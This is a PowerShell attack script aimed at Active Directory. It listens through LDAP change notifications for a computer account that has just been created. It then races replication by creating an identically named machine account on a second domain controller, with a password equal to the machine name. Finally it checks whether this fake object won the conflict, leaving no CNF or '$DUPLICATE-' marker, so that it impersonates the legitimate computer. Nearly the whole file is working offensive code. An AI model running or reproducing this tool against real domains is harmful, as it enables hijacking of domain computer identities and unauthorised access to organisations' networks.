<#
.SYNOPSIS
Dynamically duplicate a new computer joining the domain to create a conflicting object.
.DESCRIPTION
Main function: Start-LdapListener
#>

## Load necessary assemblies
$null = [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols")
$null = [System.Reflection.Assembly]::LoadWithPartialName("System.Net")

# Cache for the root DSE Ldap object
$g_rootDSE = $null

Function Connect-BindedLdap {
    param(
        [Parameter(Mandatory = $true)]
        [String] $Server,

        [Parameter(Mandatory = $true)]
        [PSCredential] $Credential
    )

    $ldap = New-Object System.DirectoryServices.Protocols.LdapConnection $Server
    $ldap.SessionOptions.ProtocolVersion = 3
    $ldap.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate
    $cred = New-Object System.Net.NetworkCredential $Credential.UserName, $Credential.Password
    $ldap.Bind($cred)

    Write-Output $ldap
}

Function Get-ConfigurationNamingContext {
    param(
        [Parameter(Mandatory = $true)]
        [System.DirectoryServices.Protocols.LdapConnection] $Ldap
    )

    $rootDSE = Get-RootDse $Ldap
    Write-Output $rootDSE.configurationnamingcontext
}

Function Get-DefaultNamingContext {
    param(
        [Parameter(Mandatory = $true)]
        [System.DirectoryServices.Protocols.LdapConnection] $Ldap
    )

    $rootDSE = Get-RootDse $Ldap
    Write-Output $rootDSE.defaultnamingcontext
}

Function Get-RootDse {
    param(
        [Parameter(Mandatory = $true)]
        [System.DirectoryServices.Protocols.LdapConnection] $Ldap
    )

    If ($Script:g_rootDSE) {
        return $Script:g_rootDSE
    }

    [System.DirectoryServices.Protocols.SearchRequest] $request = New-Object System.DirectoryServices.Protocols.SearchRequest -ArgumentList @(
        $null,
        "(objectClass=*)",
        [System.DirectoryServices.Protocols.SearchScope]::Base,
        $null
    )

    $ldapRootDSE = [System.DirectoryServices.Protocols.SearchResponse] $Ldap.SendRequest($request)

    $rootDSE = @{ }

    ForEach ($attrName in $ldapRootDSE.entries.Attributes.AttributeNames) {
        $rootDSE[$attrName] = $ldapRootDSE.entries.Attributes[$attrName].GetValues([String])
    }

    $Script:g_rootDSE = $rootDSE

    Write-Output $rootDSE
}

function Get-SecondsInterval {
    param (
        [Parameter(Mandatory = $true)]
        [DateTime]$FromDateTime
        # To now
    )

    # Get the current date and time
    $nowUtc = (Get-Date).ToUniversalTime()

    # Compute the difference
    $timespan = New-TimeSpan -Start $FromDateTime -End $nowUtc

    # Return the total seconds
    return [int]($timespan.TotalSeconds)
}

Function Invoke-NotifyCallback {
    param([System.IAsyncResult] $result)

    # We need to be fast here, faster than the replication.
    # Check twice before adding instructions because it will slow down the script.
    Try {
        $Infos = $Sender.CallbackArgs

        $prc = $Infos.LdapConnection.GetPartialResults($result)
        ForEach ($item in $prc) {
            $aryObjectClass = [array]$item.Attributes["objectClass"].GetValues([string])

            If ($aryObjectClass[-1] -ne "computer") {
                continue
            }

            $whenCreated = $item.Attributes["whenCreated"].GetValues([string])
            $dtWhenCreated = [DateTime]::ParseExact($whenCreated, "yyyyMMddHHmmss.f'Z'", $null)

            # We could also get all the computers when starting the script but it would be certainly
            # too long on big environment. Both the collect and the check if the one associated to the notification
            # is not in this big list.
            # Let's be faster by looking at the 'WhenCreated' attribute.
            # It's less precise but it should be better for the performances.
            If ((Get-SecondsInterval -FromDateTime $dtWhenCreated) -gt 15) {
                continue
            }

            $rdn = ($item.DistinguishedName -split ',')[0]
            $newMachineName = ($rdn -split '=')[1]
            $machine_account_password = ConvertTo-SecureString $newMachineName -AsPlainText -Force
            New-MachineAccount -MachineAccount $newMachineName -Password $machine_account_password -DistinguishedName $item.DistinguishedName -DomainController $Infos.TargetDomainController
            $infos.CnfMachineName = $newMachineName
            $infos.CnfDn = $item.DistinguishedName
            $infos.FlagStop = $true
        }
    } Catch {
        Write-Host $_
    }
}

Function New-AsyncCallback {
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [ScriptBlock] $Callback,

        [Parameter(Mandatory = $true)]
        [PSCustomObject] $Infos
    )

    If (-not ("AsyncCallbackForPS" -as [type])) {
        Add-Type @"
            using System;

            public sealed class AsyncCallbackForPS
            {
                public event AsyncCallback CallbackComplete = delegate { };
                public Object CallbackArgs;

                public AsyncCallbackForPS() {}

                private void CallbackInternal(IAsyncResult result)
                {
                    CallbackComplete(result);
                }

                public AsyncCallback Callback
                {
                    get { return new AsyncCallback(CallbackInternal); }
                }
            }
"@
    }
    $AsyncCB = New-Object AsyncCallbackForPS
    $AsyncCB.CallbackArgs = $Infos
    $null = Register-ObjectEvent -InputObject $AsyncCB -EventName CallbackComplete -Action $Callback
    $AsyncCB.Callback
}

Function Register-LdapSearch {
    param(
        [Parameter(Mandatory = $true)]
        [PSCustomObject] $Infos,
        [Parameter(Mandatory = $true)]
        [string] $SearchDn,
        [Parameter(Mandatory = $true)]
        [System.DirectoryServices.Protocols.SearchScope] $Scope
    )

    $Ldap = $Infos.LdapConnection

    [System.DirectoryServices.Protocols.SearchRequest] $request = New-Object System.DirectoryServices.Protocols.SearchRequest -ArgumentList @(
        $SearchDn, # root the search here
        "(objectClass=*)", # very inclusive, error when filtering on computer
        $Scope, # any scope works
        $null # we are interested in all attributes
    )

    $null = $request.Controls.Add((New-Object System.DirectoryServices.Protocols.DirectoryNotificationControl))

    [System.IAsyncResult] $result = $Ldap.BeginSendRequest(
        $request,
        (New-TimeSpan -Days 1),
        [System.DirectoryServices.Protocols.PartialResultProcessing]::ReturnPartialResultsAndNotifyCallback,
        (New-AsyncCallback ${function:Invoke-NotifyCallback} $Infos),
        $request
    )

    return $result
}

Function Stop-LdapSearches {
    param(
        [Parameter(Mandatory = $true)]
        [System.DirectoryServices.Protocols.LdapConnection] $Ldap,
        [Parameter(Mandatory = $true)]
        [System.IAsyncResult[]] $SearchResults
    )

    ForEach ($result in $SearchResults) {
        # End each async search
        Try {
            $Ldap.Abort($result)
        } Catch {
            Write-Host $_
        }
    }

    $Ldap.Dispose()
}

Function Start-LdapListener {
    param (
        [Parameter(Mandatory = $true)]
        [string]
        $Server,

        [Parameter(Mandatory = $false)]
        [AllowNull()]
        [string]
        $TargetDomainController = "",

        [Parameter(Mandatory = $true)]
        [PSCredential]
        $Credential,

        [Parameter(Mandatory = $true)]
        [ValidateRange(1, 60)]
        [int] $DurationMinutes
    )

    $ldapConnection = Connect-BindedLdap $Server $Credential

    $defaultNC = Get-DefaultNamingContext $ldapConnection
    $searchScope = [System.DirectoryServices.Protocols.SearchScope]::Subtree
    if (-not $TargetDomainController) {
        $TargetDomainController = ([array](Get-ADDomainController -Filter "IPv4Address -ne `"$Server`""))[0].HostName
    }

    $infos = [PSCustomObject] @{
        LdapConnection         = $LdapConnection
        DefaultNC              = $defaultNC
        DurationMinutes        = $DurationMinutes
        Server                 = $Server
        targetDomainController = $TargetDomainController
        FlagStop               = $false
        CnfDn                  = ""
        CnfMachineName         = ""
        ldapCounter            = 0
    }

    $searchResults = @()
    $searchResults += Register-LdapSearch $Infos $defaultNC $searchScope

    $checkerTimer = [Diagnostics.Stopwatch]::StartNew()
    Write-Host "[$(Get-Date)] Listening for $DurationMinutes minutes to duplicate the next computer that will be added to the domain (type 'q' to abort)..."
    While ($checkerTimer.Elapsed.TotalMinutes -lt $DurationMinutes) {
        If ($infos.FlagStop) {
            Write-Host "[$(Get-Date)] Addition of a new computer detected ($($infos.CnfDn))."
            Write-Host "[$(Get-Date)] Attempting to add the same account on another domain controller..."
            break
        }
        Write-Debug "still alive"

        If ([Console]::KeyAvailable) {
            $k = $Host.UI.RawUI.ReadKey('NoEcho, IncludeKeyDown')
            If ($k.Character -eq 'q') {
                break;
            }
        }
    }

    Get-EventSubscriber | Unregister-Event
    Stop-LdapSearches $ldapConnection $searchResults
    $checkerTimer.Stop()

    return $infos.CnfMachineName
}

Function Test-FakeObjectWithoutCnf {
    param (
        [Parameter(Mandatory = $true)]
        [AllowEmptyString()]
        [string]
        $CnfMachineName
    )

    If ($CnfMachineName -eq "") {
        Write-Host "[$(Get-Date)]No new machine has been identified. End."
        exit 0
    }

    $checkerTimer = [Diagnostics.Stopwatch]::StartNew()
    While ($true) {
        If (Get-ADComputer -Filter "Name -like `"$($CnfMachineName)\0ACNF*`"") {
            break
        }

        Start-Sleep -Seconds 1

        If ($checkerTimer.Elapsed.TotalSeconds -gt 20) {
            Write-Host -ForegroundColor Red "[$(Get-Date)] Error: the fake object has not been created. Need to be faster! Try again."
            $checkerTimer.Stop()
            return $false
        }
    }
    $checkerTimer.Stop()

    $CnfMachineObject = Get-ADComputer -Filter "Name -eq `"$CnfMachineName`"" -Properties "mS-DS-CreatorSID"
    If ($CnfMachineObject.PropertyNames -contains "mS-DS-CreatorSID") {
        Write-Host -ForegroundColor Green "[$(Get-Date)] (1/2) Success! The fake object looks like a normal object (NOT having 'CNF' in its DN)."
        return $true
    } Else {
        Write-Host -ForegroundColor Yellow "[$(Get-Date)] Error: the fake object looks like a strange object (having 'CNF' in its DN). Need more luck! Try again."
        return $false
    }
}

Function Test-FakeObjectWithoutDuplicate {
    param (
        [Parameter(Mandatory = $true)]
        [AllowEmptyString()]
        [string]
        $CnfMachineName
    )

    Write-Host "[$(Get-Date)] Waiting for the reboot of the new machine and authentication attempts (type 'q' to abort)..."

    $checkerTimer = [Diagnostics.Stopwatch]::StartNew()
    While ($true) {
        $computerWithoutCnf = Get-ADComputer -Filter "Name -like `"$($CnfMachineName)`""
        $computerWithCnf = Get-ADComputer -Filter "Name -like `"$($CnfMachineName)\0ACNF*`""

        If ($computerWithoutCnf.SamAccountName.StartsWith('$DUPLICATE-') -or
            $computerWithCnf.SamAccountName.StartsWith('$DUPLICATE-')) {
            break
        }

        Start-Sleep -Seconds 1

        # 5 minutes is more than needed for the reboot of the joined machine
        If ($checkerTimer.Elapsed.TotalSeconds -gt $(5 * 60)) {
            Write-Host -ForegroundColor Red "[$(Get-Date)] (2/2) Error: sAMAccountName of the 2 accounts is: $($computerWithoutCnf.SamAccountName). Are they in the same parent container?"
            $checkerTimer.Stop()
            return $false
        }

        If ([Console]::KeyAvailable) {
            $k = $Host.UI.RawUI.ReadKey('NoEcho, IncludeKeyDown')
            If ($k.Character -eq 'q') {
                return $false
            }
        }
    }
    $checkerTimer.Stop()

    If ($computerWithoutCnf.SamAccountName -eq $($computerWithoutCnf.Name + '$')) {
        Write-Host -ForegroundColor Green "[$(Get-Date)] (2/2) Success! The fake object looks like a normal object (NOT having '`$DUPLICATE-' in its sAMAccountName)."
        return $true
    } Else {
        Write-Host -ForegroundColor Yellow "[$(Get-Date)] (2/2) Error: the fake object looks like a strange object (having '`$DUPLICATE-' in its sAMAccountName). Need more luck! Try again."
        return $false
    }
}